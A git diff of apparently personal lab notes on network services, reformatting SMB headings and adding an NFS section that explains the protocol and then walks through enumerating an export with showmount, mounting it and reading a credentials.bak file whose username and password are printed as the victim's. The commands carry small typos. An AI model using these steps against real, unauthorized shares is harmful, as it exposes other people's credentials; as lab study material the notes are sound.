@@ -1,9 +1,9 @@
-                                       👀  Network Service 
+#  👀  Network Service 
 
 
-# 🔥 SMB:(Like FTP)
+# 🔥 SMB (Server Message Block :port numbers 139 and 445) :
   
-### What is SMB?
+### What is SMB?(Like FTP)
 
 SMB - Server Message Block Protocol - is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network.
 
@@ -117,4 +117,63 @@ You can connect to a telnet server with the following syntax:
     "telnet [ip] [port]"
 
 We're going to need to keep this in mind as we try and exploit this machine.
+
+# 🎆 NFS(Network File System :TCP port 2049 ) :
+
+NFS, or Network File System, was designed in 1984 by Sun Microsystems. This distributed file system protocol allows a user on a client computer to access files over a network in the same way they would access a local storage file. Because it is an open standard, anyone can implement the protocol. NFS started in-system as an experiment but the second version was publicly released after the initial success.
+### 😬 How does NFS work?
+To access data stored on another machine (i.e. a server) the server would implement NFS daemon processes to make data available to clients. The server administrator determines what to make available and ensures it can recognize validated clients.
+
+From the client's side, the machine requests access to exported data, typically by issuing a mount command. If successful, the client machine can then view and interact with the file systems within the decided parameters.
+
+### 👽Mount :
+Mounting a filesystem simply means making the particular filesystem accessible at a certain point in the Linux directory tree. When mounting a filesystem it does not matter if the filesystem is a hard disk partition, CD-ROM, floppy, or USB storage device. You simply need to know the device name associated with the particular storage device and a directory you would like to mount it to. 
+
+### Now time to Exploit NFS :
+
+Process :
+          Use showmount command for checking mount file on target machine
+          
+          showmount -e ip
+          shouwmount -e 10.10.71.180   (Example )
+          
+          Result :
+          /var/nfs/general * 
+          
+          
+
+Then , 
+      attach mount file  in your local pc using mount command
+
+
+          sudo mount ip:/mount_file_path  your_local_file_path
+
+          sudo mount 10.10.71.180:/var/nfs/general /mnt     
+
+#### 👀 Note : 
+              /var/nfs/general  is mount share file via nfs 
+              /mnt is locat dirtectory where mount file will be saved
+        
+Then ,
+      Check mount file on your local device :
+
+                                             ls -la /mnt
+                                                                          
+                                             total 12
+                                             drwxr-xr-x  2 nobody nogroup 4096 Nov 21 10:24 .
+                                             drwxr-xr-x 19 root   root    4096 Mar 20 23:41 ..
+                                             -rw-r--r--  1 root   root      31 Nov 21 10:24 credentials.bak
+
+
+Finally  , 
+          Read mount file :
+
+                    sudo cat /mnt/credential.bak
+
+                    paradoxial.test
+                    ShibaPretzel79
+
+##### 😍Here , paradoxial.test is the username of victim and ShibaPretzel79 is the password of victim
+
+🙄 Happy Hacking 😍
 
